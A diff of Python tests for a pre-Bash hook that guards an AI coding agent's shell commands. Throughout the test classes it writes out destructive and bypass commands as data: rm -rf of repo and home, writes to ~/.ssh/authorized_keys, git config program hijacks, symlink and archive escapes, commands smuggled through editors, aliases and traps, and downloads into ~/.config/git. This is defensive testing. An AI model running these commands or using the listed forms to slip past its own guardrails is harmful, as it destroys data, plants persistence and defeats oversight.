@@ -659,5 +659,876 @@ class Lifecycle(RepoCase):
             self.assertEqual(self.bash(cmd).returncode, 0, cmd)
 
 
+class Uninitialized(RepoCase):
+    """0005 S4 (gap 2): in a repo without .aiops/, shell writes to the toolchain, the plugin and secrets outside the
+    repo are blocked through hooks/engine.sh pre-bash; the SDLC gates stay dormant."""
+    def setUp(self):
+        super().setUp()
+        import shutil
+        shutil.rmtree(self.root / ".aiops")
+
+    def engine(self, cmd):
+        import subprocess
+        from helpers import ROOT
+        env = {**self.env, "CLAUDE_PROJECT_DIR": str(self.root), "CLAUDE_PLUGIN_ROOT": str(ROOT)}
+        return subprocess.run([str(ROOT / "hooks" / "engine.sh"), "pre-bash"], capture_output=True, text=True,
+                              input=json.dumps(self.hook_input("Bash", command=cmd)), env=env, cwd=self.root)
+
+    def test_safety_pass_blocks(self):
+        from helpers import ROOT
+        for cmd, rid in [("echo x >> ~/.gitconfig", "G-TOOL-04"), ("echo x >> ~/.bashrc", "G-TOOL-04"),
+                         ("echo x >> ~/.ssh/authorized_keys", "G-SEC-01"),
+                         (f"echo x > {ROOT}/lib/sdlc_engine/x.py", "G-TOOL-02"),
+                         ("git config --global gpg.ssh.program /tmp/x", "G-TOOL-05"),
+                         ("echo x > .env.local", "G-SEC-01"),          # secrets: every repo (review round 1)
+                         ("bash -c 'echo x >> ~/.bashrc'", "G-TOOL-04")]:
+            r = self.engine(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stdout}{r.stderr}")
+            self.assertIn(f"[{rid}]", r.stderr, cmd)
+
+    def test_gates_stay_dormant(self):
+        for cmd in ("rm -rf src", "echo x > src/a.py", "git push origin main", "git config user.name x",
+                    "git merge feat/x"):
+            r = self.engine(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stdout}{r.stderr}")
+
+
+class ProtectedTree(RepoCase):
+    """0005 S5 (gap 1): deleting or moving a directory that holds the repo, .aiops/.git, a protected path or a
+    tracked secret is blocked in every state; ordinary deletes stay allowed."""
+    def setUp(self):
+        super().setUp()
+        self.to_execution()                                           # state 4: the read-only lock is off
+        for rel in (".github/workflows/aiops-gates.yml", ".claude/settings.json", "docs/CODEOWNERS", "build/out.o"):
+            (self.root / rel).parent.mkdir(parents=True, exist_ok=True)
+            (self.root / rel).write_text("x\n")
+        (self.root / ".aiops" / "config" / "protected-paths").write_text("docs/CODEOWNERS ownership is human-owned\n")
+
+    def bash(self, cmd):
+        return self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})
+
+    def test_blocks_in_unlocked_state(self):
+        for cmd in ("rm -rf ./", "rm -rf -- .", 'rm -rf "$PWD"', f"rm -rf {self.root}", "rm -rf ..", "rm -rf ~/",
+                    "rm -rf /", "rm -rf .github/workflows", "mv .github /tmp/x", "rm -rf .claude", "rm -rf .aiops",
+                    "rm -rf .git", "rm -rf docs", "rmdir .github", "find .github -delete", "find . -delete"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, cmd)
+            want = "G-ART-05" if ".aiops" in cmd else "G-TOOL-03" if ".git " in cmd + " " else "G-FILE-05"
+            self.assertIn(f"[{want}]", r.stderr, cmd)                    # AC-1: the exact id (review round 1)
+            self.assertIn("Procedure:", r.stderr, cmd)
+
+    def test_allows_ordinary_deletes(self):
+        import time
+        nm = self.root / "node_modules"
+        for i in range(100):
+            d = nm / f"p{i}"
+            d.mkdir(parents=True)
+            for j in range(100):
+                (d / f"f{j}.js").write_text("")
+        for cmd in ("rm -rf build/", "rm src/app.py", "cp README.md docs/", "mv src/app.py src/b.py",
+                    "find . -name '*.pyc' -delete", "find build -type f -delete"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+        t = time.monotonic()
+        r = self.bash("rm -rf node_modules")
+        took = time.monotonic() - t
+        self.assertEqual(r.returncode, 0, r.stderr)
+        self.assertLess(took, 2.0, "the hook itself starts python; the tree check must not walk node_modules")
+        from sdlc_engine import guards
+        t = time.monotonic()
+        self.assertIsNone(guards._contains_protected(self.root, "node_modules", self.root))
+        self.assertLess(time.monotonic() - t, 0.2)
+
+    def test_tracked_secret_dir(self):
+        (self.root / "config").mkdir()
+        (self.root / "config" / "prod.key").write_text("k\n")
+        git(self.root, "add", "-f", "config/prod.key")
+        git(self.root, "commit", "-qm", "key")
+        r = self.bash("rm -rf config")
+        self.assertEqual(r.returncode, 2, r.stderr)
+        self.assertIn("[G-FILE-05]", r.stderr)
+
+
+class Incoming(RepoCase):
+    """0005 S6-S7 (gap 4): archives, stashes, merges and pulls can't bring in protected config (G-FILE-06)."""
+    def setUp(self):
+        super().setUp()
+        self.to_execution()                                           # state 4: unlocked
+
+    def bash(self, cmd):
+        return self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})
+
+    def archive(self, name, members):
+        import io
+        import tarfile
+        import zipfile
+        f = self.root / name
+        if name.endswith(".zip"):
+            with zipfile.ZipFile(f, "w") as z:
+                for m in members:
+                    z.writestr(m, "x\n")
+        else:
+            with tarfile.open(f, "w:gz") as t:
+                for m in members:
+                    info = tarfile.TarInfo(m)
+                    info.size = 2
+                    t.addfile(info, io.BytesIO(b"x\n"))
+
+    def assertBlocked(self, cmd, rid="G-FILE-06"):
+        r = self.bash(cmd)
+        self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
+        self.assertIn(f"[{rid}]", r.stderr, cmd)
+
+    def test_archives(self):
+        self.archive("bad.tgz", ["src/a.py", ".aiops/config/allowed-commands"])
+        self.archive("bad.zip", ["src/a.py", ".claude/settings.json"])
+        self.archive("ci.tgz", ["./.github/workflows/aiops-gates.yml"])
+        self.archive("good.tgz", ["src/a.py", "src/b.py"])
+        self.archive("good.zip", ["src/c.py"])
+        for cmd in ("tar -xzf bad.tgz", "tar xzf bad.tgz", "tar -x -f bad.tgz", "unzip bad.zip", "unzip -o bad.zip",
+                    "tar -xzf ci.tgz", "tar -xzf missing.tgz", "unzip missing.zip"):
+            self.assertBlocked(cmd)
+        for cmd in ("tar -xzf good.tgz", "unzip good.zip", "tar -tzf bad.tgz", "unzip -l bad.zip",
+                    "tar -xzf bad.tgz -C /tmp/elsewhere"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+    def commit_on(self, branch, rel, text, base=None):
+        git(self.root, "switch", "-qc", branch, *([base] if base else []))
+        (self.root / rel).parent.mkdir(parents=True, exist_ok=True)
+        (self.root / rel).write_text(text)
+        git(self.root, "add", "-f", rel)
+        git(self.root, "commit", "-qm", f"change {rel}")
+        sha = git(self.root, "rev-parse", "HEAD")
+        git(self.root, "switch", "-q", "feat/0001-csv-export")
+        return sha
+
+    def test_stash(self):
+        cfg = self.root / ".aiops" / "config" / "protected-paths"
+        cfg.write_text("legacy/* frozen\n")
+        git(self.root, "add", "-f", ".aiops/config/protected-paths")
+        git(self.root, "commit", "-qm", "track config")
+        cfg.write_text("")                                             # stash@{1}: a change to protected config
+        git(self.root, "stash", "-q")
+        (self.root / "src" / "app.py").write_text("x = 3\n")          # stash@{0}: code only
+        git(self.root, "stash", "-q")
+        self.assertEqual(self.bash("git stash pop").returncode, 0)
+        self.assertBlocked("git stash apply stash@{1}")
+        self.assertBlocked("git stash pop 'stash@{1}'")
+
+    def test_merge_rebase_cherry_pick(self):
+        bad = self.commit_on("x", ".aiops/config.json", '{"approval_key_policy": "any"}\n')
+        self.commit_on("approvals", ".aiops/0001-csv-export/plan.md",
+                       (self.d / "plan.md").read_text() + "\n")
+        main_change = self.commit_on("tmp-main", ".aiops/config.json", "{}\n", base="main")
+        git(self.root, "branch", "-qf", "main", main_change)
+        git(self.root, "update-ref", "refs/remotes/origin/main", main_change)
+        for cmd in ("git merge x", "git rebase x", f"git cherry-pick {bad}", "git merge --no-ff x", "git merge nosuch"):
+            self.assertBlocked(cmd)
+        for cmd in ("git merge main", "git merge origin/main", "git rebase origin/main", "git merge approvals",
+                    "git merge --abort", "git rebase --continue"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+    def test_pull(self):
+        r = self.bash("git pull")
+        self.assertEqual(r.returncode, 2, r.stderr)
+        self.assertIn("[G-FILE-06]", r.stderr)
+        self.assertIn("git fetch", r.stderr)
+        self.assertBlocked("git pull origin feat/0001-csv-export")
+        git(self.root, "switch", "-q", "main")
+        self.assertNotIn("[G-FILE-06]", self.bash("git pull").stderr)        # on main: only the usual lock applies
+        self.assertNotIn("[G-FILE-06]", self.bash("git pull origin main").stderr)
+        for cmd in ("git pull origin x", "git pull . x", "git pull --rebase origin x"):   # round 1: only main itself
+            self.assertIn("[G-FILE-06]", self.bash(cmd).stderr, cmd)
+
+
+class Wrappers(RepoCase):
+    """0005 review round 1: a wrapper prefix (nice, timeout 5, stdbuf, sudo -u x, …) doesn't hide a write."""
+    def bash(self, cmd):
+        return self.hook("pre-bash", self.hook_input("Bash", command=cmd), env={"CLAUDE_PROJECT_DIR": str(self.root)})
+
+    def test_wrappers_are_seen_through(self):
+        self.write("intent", INTENT)                                  # state 1: code is locked
+        for cmd in ("timeout 5 rm -rf .aiops", "nice tee .aiops/config/readonly-exempt", "echo x | nice tee src/app.py",
+                    "timeout 5 sh -c 'echo x > src/app.py'", "nice -n 5 rm src/app.py", "stdbuf -o0 tee src/app.py",
+                    "setsid rm src/app.py", "ionice -c3 rm src/app.py", "command -p rm src/app.py",
+                    "sudo -u me rm src/app.py", "flock /tmp/l rm src/app.py", "timeout -s KILL 5 rm src/app.py",
+                    "nohup rm src/app.py", "time -p rm src/app.py", "busybox rm src/app.py", "xargs -n 1 rm src/app.py"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, cmd)
+        self.to_execution_from_intent()
+        for cmd in ("timeout 60 make check", "nice -n 5 python -m pytest", "time ls"):
+            self.assertEqual(self.bash(cmd).returncode, 0, cmd)
+
+    def to_execution_from_intent(self):
+        self.approve("intent")
+        self.write("spec", SPEC)
+        self.approve("spec")
+        self.write("plan", PLAN)
+        self.approve("plan")
+
+
+class UninitializedRound1(Uninitialized):
+    """0005 review round 1: the safety pass at a $HOME session root, git config forms, copies into home."""
+    test_safety_pass_blocks = test_gates_stay_dormant = None
+
+    def engine_at(self, cmd, cwd, home):
+        import subprocess
+        from helpers import ROOT
+        env = {**self.env, "CLAUDE_PROJECT_DIR": str(cwd), "CLAUDE_PLUGIN_ROOT": str(ROOT), "HOME": str(home)}
+        payload = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(cwd)}
+        return subprocess.run([str(ROOT / "hooks" / "engine.sh"), "pre-bash"], capture_output=True, text=True,
+                              input=json.dumps(payload), env=env, cwd=cwd)
+
+    def test_session_at_home(self):
+        import tempfile
+        from pathlib import Path
+        with tempfile.TemporaryDirectory() as h:
+            home = Path(h)
+            git(home, "init", "-q")                                   # a dotfiles repo at $HOME
+            for cmd, rid in [("echo x >> ~/.bashrc", "G-TOOL-04"), ("echo x >> ~/.ssh/authorized_keys", "G-SEC-01"),
+                             ("echo x >> .bashrc", "G-TOOL-04")]:
+                r = self.engine_at(cmd, home, home)
+                self.assertEqual(r.returncode, 2, f"{cmd}: {r.stdout}{r.stderr}")
+                self.assertIn(f"[{rid}]", r.stderr, cmd)
+
+    def test_git_config_forms(self):
+        for cmd in ("git config --glob gpg.ssh.program /tmp/x", "git config --syst gpg.program /tmp/x",
+                    "git config -f ~/.gitconfig gpg.ssh.program /tmp/x",
+                    "git config --file=~/.gitconfig core.hooksPath /x",
+                    "GIT_CONFIG=/tmp/c git config gpg.program y", "GIT_CONFIG_GLOBAL=/tmp/c git config user.signingkey y",
+                    "nice git config --global gpg.program /tmp/x"):
+            r = self.engine(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stdout}{r.stderr}")
+            self.assertIn("[G-TOOL-05]", r.stderr, cmd)
+        self.assertEqual(self.engine("git config user.name x").returncode, 0)
+        self.assertEqual(self.engine("git config -f .git/x.cfg user.name x").returncode, 0)
+
+    def test_copies_into_home(self):
+        for cmd in ("cp -r /tmp/dot/. ~/", "rsync -a /tmp/dot/ ~/", "tar -xzf home.tgz -C ~",
+                    "unzip plug.zip -d ~/.claude", "cp x ~/.config/git/", "nice cp -r /tmp/dot/. ~/"):
+            r = self.engine(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stdout}{r.stderr}")
+        for cmd in ("cp a.txt /tmp/out/", "tar -xzf a.tgz -C /tmp/out", "cp src/app.py /tmp/x.py"):
+            self.assertEqual(self.engine(cmd).returncode, 0, cmd)
+
+
+class IncomingRound1(Incoming):
+    """0005 review round 1: every merge/rebase operand, value options, cherry-pick ranges, archive tricks."""
+    test_archives = test_stash = test_merge_rebase_cherry_pick = test_pull = None
+
+    def setUp(self):
+        super().setUp()
+        self.bad = self.commit_on("x", ".aiops/config.json", '{"approval_key_policy": "any"}\n')
+        self.commit_on("approvals", ".aiops/0001-csv-export/plan.md", (self.d / "plan.md").read_text() + "\n")
+
+    def test_every_operand_and_value_options(self):
+        for cmd in ("git merge main x", "git merge origin/main x", "git rebase main x", "git merge -m main x",
+                    "git cherry-pick ^HEAD x", f"git cherry-pick -m 1 {self.bad}", "git merge -X theirs x",
+                    "git merge --strategy=ours x"):
+            self.assertBlocked(cmd)
+        for cmd in ('git merge -m "merge it" approvals', "git merge -X theirs approvals", "git merge -s ours main",
+                    "git merge --no-ff -m 'Merge main' main", "git rebase", "git merge --no-edit approvals",
+                    "git cherry-pick -x approvals"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+    def test_archive_tricks(self):
+        import io
+        import tarfile
+        self.archive("strip.tgz", ["pkg/src/a.py", "pkg/.aiops/config/allowed-commands"])
+        self.archive("ok.tgz", ["pkg/src/a.py"])
+        with tarfile.open(self.root / "link.tgz", "w:gz") as t:              # a symlink member, then a file through it
+            lnk = tarfile.TarInfo("l")
+            lnk.type, lnk.linkname = tarfile.SYMTYPE, ".aiops/config"
+            t.addfile(lnk)
+            info = tarfile.TarInfo("l/allowed-commands")
+            info.size = 2
+            t.addfile(info, io.BytesIO(b"x\n"))
+        self.archive("via.tgz", ["l2/allowed-commands"])
+        (self.root / "l2").symlink_to(self.root / ".aiops" / "config")      # an existing in-repo symlink
+        for cmd in ("tar -xzf strip.tgz --strip-components=1", "tar -xzf strip.tgz --strip-components 1",
+                    "tar -xzf link.tgz", "tar -xzf via.tgz", "tar -xzf ok.tgz --transform s/a/b/",
+                    "tar -xzPf ok.tgz", "busybox tar -xzf strip.tgz --strip-components=1"):
+            self.assertBlocked(cmd)
+        for cmd in ("tar -xzf ok.tgz --strip-components=1", "tar xfz ok.tgz"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+
+class ProtectedTreeRound1(ProtectedTree):
+    """0005 review round 1: filtered find, -exec, pushd, a symlink made in the same command, rsync --delete."""
+    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None
+
+    def test_more_forms_blocked(self):
+        for cmd in ("find .github -type f -delete", "find .github -name '*.yml' -delete",
+                    "find docs -name CODEOWNERS -delete", "find .github -exec rm -rf {} +",
+                    "ln -s .github q && rm -rf q/", "pushd .github && rm -rf workflows",
+                    "rsync -a --delete build/ .github/workflows/", "find . -name 'aiops-gates.yml' -delete"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
+            self.assertIn("[G-FILE-05]", r.stderr, cmd)
+
+    def test_still_allowed(self):
+        (self.root / "gh").symlink_to(self.root / ".github")
+        for cmd in ("rm -rf gh", "rm gh", "find . -name '*.pyc' -delete", "find build -type f -delete",
+                    "find docs -name '*.tmp' -delete", "rsync -a --delete src/ build/", "pushd build && rm -rf out.o"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+
+class Round2(ProtectedTree):
+    """0005 review round 2: close each bypass class, and the false positives round 1 introduced."""
+    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None
+
+    def blocked(self, cmds):
+        for cmd in cmds:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
+
+    def allowed(self, cmds):
+        for cmd in cmds:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+    def test_nested_and_wrapper_forms(self):
+        self.blocked(["trap 'rm -rf docs' EXIT", "coproc rm -rf docs", "watch -n1 rm -rf docs",
+                      "parallel rm -rf ::: docs", "flock /tmp/l -c 'rm -rf docs'", "flock -c 'rm -rf docs' /tmp/l",
+                      "find .github -exec sh -c 'rm \"$1\"' _ {} \\;", "find .github -name '*.yml' -exec nice rm {} +",
+                      "git -c alias.zz='!rm -rf .github' zz", "git rebase --exec 'rm -rf .github' main",
+                      "git rebase -x 'rm -rf .github' main"])
+        self.allowed(["trap 'echo done' EXIT", "watch -n1 ls", "git rebase --exec 'make test' main",
+                      "find . -name '*.py' -exec grep -l TODO {} +"])
+
+    def test_negated_find(self):
+        self.blocked(["find .github -not -name x -delete", "find .github ! -name x -delete",
+                      "find .github -name x -o -delete", "find . -atime +30 -delete"])
+        self.allowed(["find . -type d -empty -delete", "find build -type d -delete", "find . -name '*.pyc' -delete"])
+
+    def test_links_made_in_the_same_command(self):
+        self.blocked(["ln -s .github q && rm -rf q/workflows", "ln -s .github q && rm -rf q/*",
+                      "ln -s .github q && mv q/workflows /tmp/x", "ln -s . q && rm -rf q/.github",
+                      "ln -s .aiops/config d && tar -xzf x.tgz -C d"])
+
+    def test_rsync_and_tar_forms(self):
+        self.blocked(["rsync -a --del build/ .github/workflows/",
+                      "rsync -a --delete build/ .github/workflows/ --exclude foo",
+                      "rsync --remove-source-files .github/workflows/ /tmp/x",
+                      "tar -xzf x.tgz --one-top-level=.aiops/config"])
+        self.allowed(["rsync -a --delete --exclude .git src/ build/"])
+
+    def test_same_command_time_of_check(self):
+        self.archive("good.tgz", ["src/a.py"])
+        git(self.root, "branch", "benign")
+        self.blocked(["cp /tmp/evil.tgz good.tgz && tar -xzf good.tgz", "git branch -f benign x && git merge benign",
+                      "git update-ref refs/heads/benign HEAD~1 && git merge benign", "echo HEAD | git cherry-pick --stdin"])
+        self.allowed(["tar -xzf good.tgz"])
+
+    def archive(self, name, members):
+        Incoming.archive(self, name, members)
+
+    def test_cherry_pick_stuck_mainline(self):
+        self.blocked(["git cherry-pick -m2 nosuch"])
+
+    def test_pull_on_main_with_config(self):
+        git(self.root, "switch", "-q", "main")
+        for cmd in ("git -c branch.main.merge=refs/heads/x -c branch.main.remote=. pull",
+                    "git -c remote.origin.url=/tmp/evil pull origin main", "git branch -u x && git pull"):
+            self.assertIn("[G-FILE-06]", self.bash(cmd).stderr, cmd)
+
+    def test_git_config_option_forms_initialized(self):
+        self.blocked(["git config --fil ~/.gitconfig gpg.ssh.program /tmp/x",
+                      "git config --fil=.git/config core.fsmonitor /tmp/x", "git config -f.git/config core.hooksPath x"])
+
+    def test_writes_into_home(self):
+        self.blocked(["git clone /tmp/evil ~/.config/git", "git --work-tree=$HOME checkout HEAD -- .bashrc",
+                      "wget -P ~/.config/git https://x/y", "curl --output-dir ~/.config/git -O https://x/y"])
+        self.allowed(["git clone https://x/y /tmp/y", "wget -P /tmp/dl https://x/y"])
+
+    def test_link_member_archives_in_subdirs(self):
+        import io
+        import tarfile
+        with tarfile.open(self.root / "node.tgz", "w:gz") as t:
+            lnk = tarfile.TarInfo("node/bin/npm")
+            lnk.type, lnk.linkname = tarfile.SYMTYPE, "../lib/npm/cli.js"
+            t.addfile(lnk)
+            info = tarfile.TarInfo("node/lib/npm/cli.js")
+            info.size = 2
+            t.addfile(info, io.BytesIO(b"x\n"))
+        with tarfile.open(self.root / "escape.tgz", "w:gz") as t:
+            lnk = tarfile.TarInfo("e")
+            lnk.type, lnk.linkname = tarfile.SYMTYPE, "../../.aiops/config"
+            t.addfile(lnk)
+        (self.root / "vendor").mkdir()
+        self.allowed(["tar -xzf node.tgz -C vendor"])
+        self.blocked(["tar -xzf node.tgz", "tar -xzf escape.tgz -C vendor"])
+
+    def test_stash_pop_without_stash_is_left_to_git(self):
+        self.allowed(["git stash pop"])
+
+
+class Round2Timing(RepoCase):
+    def test_check_bash_decides_fast_and_pull_on_main_passes(self):
+        import time
+        from sdlc_engine import guards
+        self.to_execution()                                           # state 4: unlocked
+        nm = self.root / "node_modules"
+        for i in range(50):
+            (nm / f"p{i}").mkdir(parents=True)
+            for j in range(200):
+                (nm / f"p{i}" / f"f{j}.js").write_text("")
+        t = time.monotonic()
+        self.assertIsNone(guards.check_bash({"tool_input": {"command": "rm -rf node_modules"}, "cwd": str(self.root)}))
+        self.assertLess(time.monotonic() - t, 0.2, "AC-2: the whole engine decision, in process")
+        cfg = self.root / ".aiops" / "config.json"
+        cfg.write_text('{"approval_key_policy": "any", "lock_when_idle": false}')
+        git(self.root, "switch", "-q", "main")
+        self.assertIsNone(guards.check_bash({"tool_input": {"command": "git pull"}, "cwd": str(self.root)}))   # AC-8
+
+
+class SafetyPassFuzz(Uninitialized):
+    """The safety pass runs on every Bash call in every repo and fails closed on a crash: common commands must
+    neither crash it nor be blocked."""
+    test_safety_pass_blocks = test_gates_stay_dormant = None
+
+    def test_common_commands(self):
+        from sdlc_engine import guards
+        cmds = ["ls -la", "git status", "make test", "npm install", "pip install -e .", "python -m pytest -q",
+                "cat <<'EOF' > notes.md\nhello\nEOF", "for f in *.py; do echo $f; done", "case $x in a) ls;; esac",
+                "echo $((1+2))", "echo $'a\\tb'", "cd src && ls", "(cd build && make)", "{ ls; pwd; } > out.txt",
+                "x=1; echo $x", "tar czf out.tgz src", "find . -name '*.py' | xargs wc -l", "grep -rn TODO src",
+                "docker build -t x .", "git log --oneline -5 | cat", "timeout 60 make check", "time make",
+                "cp a.txt b.txt", "mv a.txt b.txt", "rm -f b.txt", "mkdir -p out && touch out/x", "sed -n 1,5p f",
+                "awk '{print $1}' f", "curl -s https://x/y -o out.json", "node -e 'console.log(1)'", "echo done &",
+                "exec 3>/tmp/f", "set -euo pipefail", "export FOO=1", "source .venv/bin/activate", "unset FOO",
+                "true && false || echo x", "! ls", "ls | tee log.txt", "cp -r src/ .", "tar xzf a.tgz"]
+        for cmd in cmds:
+            with self.subTest(cmd=cmd[:30]):
+                out = guards.check_bash({"tool_input": {"command": cmd}, "cwd": str(self.root)})
+                self.assertIsNone(out, f"{cmd}: {out}")
+
+    def test_venv_on_path_does_not_block_copies(self):
+        import os
+        venv = self.root / ".venv" / "bin"
+        venv.mkdir(parents=True)
+        r = self.engine_env("cp -r dist/ ./", {"PATH": f"{venv}:{os.environ.get('PATH', '')}"})
+        self.assertEqual(r.returncode, 0, r.stderr)
+
+    def engine_env(self, cmd, extra):
+        import subprocess
+        from helpers import ROOT
+        env = {**self.env, "CLAUDE_PROJECT_DIR": str(self.root), "CLAUDE_PLUGIN_ROOT": str(ROOT), **extra}
+        return subprocess.run([str(ROOT / "hooks" / "engine.sh"), "pre-bash"], capture_output=True, text=True,
+                              input=json.dumps(self.hook_input("Bash", command=cmd)), env=env, cwd=self.root)
+
+
+class TokenizerKeywords(ProtectedTree):
+    """Review round 3 BLOCKER: after a shell keyword or a function header, `!` and `{` are in command position again;
+    every row is blocked on main with the same id."""
+    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None
+
+    def test_keywords_put_bang_and_brace_back_in_command_position(self):
+        for cmd, rid in [("if ! rm -rf .aiops; then :; fi", "G-ART-05"), ("while ! rm -rf .aiops; do :; done", "G-ART-05"),
+                         ("if ! cp x .aiops/config.json; then :; fi", "G-ART-05"), ("then ! rm -rf .aiops", "G-ART-05"),
+                         ("if true; then { rm -rf .aiops; }; fi", "G-ART-05"),
+                         ("for i in 1; do { rm -rf .aiops; }; done", "G-ART-05"),
+                         ("if false; then :; else { rm -rf .aiops; }; fi", "G-ART-05"),
+                         ("time { rm -rf .aiops; }", "G-ART-05"), ("f(){ rm -rf .aiops; }; f", "G-ART-05"),
+                         ("until ! rm -rf .github; do :; done", "G-FILE-05"), ("elif ! mv .github /tmp/x; then :; fi", "G-FILE-05")]:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
+            self.assertIn(f"[{rid}]", r.stderr, cmd)
+        for cmd in ("find . ! -name x -print", "echo }", "[ ! -d build ] && mkdir build", "test ! -f x || rm x",
+                    "if ! make check; then echo no; fi", "{ echo a; echo b; } > /tmp/out"):
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+    def test_negated_find_message_says_why(self):
+        r = self.bash("find . -not -path './.git/*' -name '*.orig' -delete")
+        self.assertEqual(r.returncode, 2)
+        self.assertIn("negated", r.stderr)
+
+
+class Round3(ProtectedTree):
+    """0005 review round 3: two regressions against main, then the remaining classes."""
+    test_blocks_in_unlocked_state = test_allows_ordinary_deletes = test_tracked_secret_dir = None
+
+    def blocked(self, cmds):
+        for cmd in cmds:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 2, f"{cmd}: {r.stderr}")
+
+    def allowed(self, cmds):
+        for cmd in cmds:
+            r = self.bash(cmd)
+            self.assertEqual(r.returncode, 0, f"{cmd}: {r.stderr}")
+
+    def test_ln_destination_is_still_a_write(self):            # CRITICAL regression: blocked on main
+        self.blocked(["ln -sf /tmp/evil .github/workflows/aiops-gates.yml", "ln -sf /tmp/x .aiops/config/allowed-commands",
+                      "ln -sf /tmp/x .claude/settings.json", "ln -sfn /tmp/x .git/hooks/pre-commit"])
+
+    def test_escaped_find_syntax(self):
+        self.blocked([r"find .aiops \( -type f \) -delete", r"find .github \( -type f \) -delete",
+                      r"find . \( -name .aiops \) -exec rm -rf {} +", r"find .github -name x -exec rm {} \; -o -exec rm {} \;"])
+        self.allowed([r"find . \( -name '*.pyc' -o -name '*.pyo' \) -delete", r"find . -name '*.py' -exec grep x {} \;"])
+
+    def test_directory_names_with_recursive_exec(self):
+        self.blocked(["find . -name .github -exec rm -rf {} +", "find . -path ./.github -exec rm -rf {} +",
+                      "find . -maxdepth 1 -name '.g*' -exec rm -rf {} +", "find . -name docs -type d -exec rm -rf {} +",
+                      "find .github -type d -name workflows -exec rm -rf {} +"])
+        self.allowed(["find . -name __pycache__ -type d -exec rm -rf {} +"])
+
+    def test_more_nested_forms(self):
+        self.blocked(["sh -c 'rm -rf \"$0\"' docs", "bash -c 'd=$0; rm -rf $d' docs", "trap -- 'rm -rf docs' EXIT",
+                      "flock /tmp/l --command='rm -rf docs'", "coproc X { rm -rf docs; }", "parallel -j2 rm -rf ::: docs",
+                      "script -qc 'rm -rf docs' /dev/null", "su -c 'rm -rf docs' me", r"git rebase -xrm\ -rf\ docs main",
+                      "git -c core.editor='rm -rf docs' commit", "git -c sequence.editor='rm -rf docs' rebase -i main",
+                      "git -c core.pager='rm -rf docs' log", "GIT_EDITOR='rm -rf docs' git commit",
+                      "GIT_SEQUENCE_EDITOR='rm -rf docs' git rebase -i main", "git bisect run rm -rf docs",
+                      "git submodule foreach 'rm -rf ../docs'"])
+        self.allowed(["git -c core.editor=vim commit -m x", "git bisect run make test", "script -qc 'make test' /dev/null"])
+
+    def test_more_link_forms(self):
+        (self.root / "t").mkdir()
+        self.blocked(["ln -s .github q2 && ln -s q2 q3 && rm -rf q3/workflows",
+                      "ln -s ../.github t/q && rm -rf t/q/workflows", "ln -t /tmp -s $PWD/.github && rm -rf /tmp/.github/workflows"])
+
+    def test_hard_links_reach_protected_files(self):
+        self.blocked(["ln .aiops/config/protected-paths hl2", "ln .github/workflows/aiops-gates.yml hl",
+                      "cp -l .claude/settings.json s2", "cp --link .github/workflows/aiops-gates.yml w2"])
+        self.allowed(["ln -s README.md readme-link", "cp README.md r2"])
+
+    def test_tar_abbreviations_and_time_of_check(self):
+        Incoming.archive(self, "good.tgz", ["src/a.py"])
+        Incoming.archive(self, "strip.tgz", ["pkg/.aiops/config/allowed-commands"])
+        git(self.root, "branch", "benign")
+        self.allowed(["tar -xzf good.tgz --strip-comp=1"])                  # read correctly: nothing guarded
+        self.blocked(["tar -xzf strip.tgz --strip-comp=1", "tar -xzf strip.tgz --strip-c 1", "tar -xzf good.tgz --tran s/a/b/", "tar -xzf good.tgz --xfor s/a/b/",
+                      "tar -xzf good.tgz --one-top=.aiops/config", "ln -sf /tmp/evil.tgz good.tgz && tar -xzf good.tgz",
+                      "cp /tmp/x/good.tgz . && tar -xzf good.tgz", "bash -c 'cp /tmp/e.tgz good.tgz' && tar -xzf good.tgz",
+                      "git checkout -B benign HEAD~1 && git merge benign", "git switch -C benign HEAD~1 && git merge benign",
+                      "git push . HEAD:benign && git merge benign", "git symbolic-ref refs/heads/benign refs/heads/main && git merge benign",
+                      "git tag -f benign HEAD~1 && git merge benign", "git worktree add -B benign /tmp/w && git merge benign",
+                      "git cherry-pick -nm2 nosuch"])
+        self.allowed(["git status && git merge benign", "git fetch origin && git log -1"])
+
+    def test_writes_into_home_more(self):
+        self.blocked(["git clone --depth 1 /tmp/evil ~/.config/git", "git clone -b main /tmp/evil ~/.config/git",
+                      "GIT_WORK_TREE=$HOME git checkout HEAD -- .bashrc", "cd ~/.config/git && wget https://e.x/config",
+                      "cd ~/.local/bin && curl -O https://e.x/ssh-keygen", "rsync --remove-sent-files .github/workflows/ /tmp/x"])
+        import tempfile
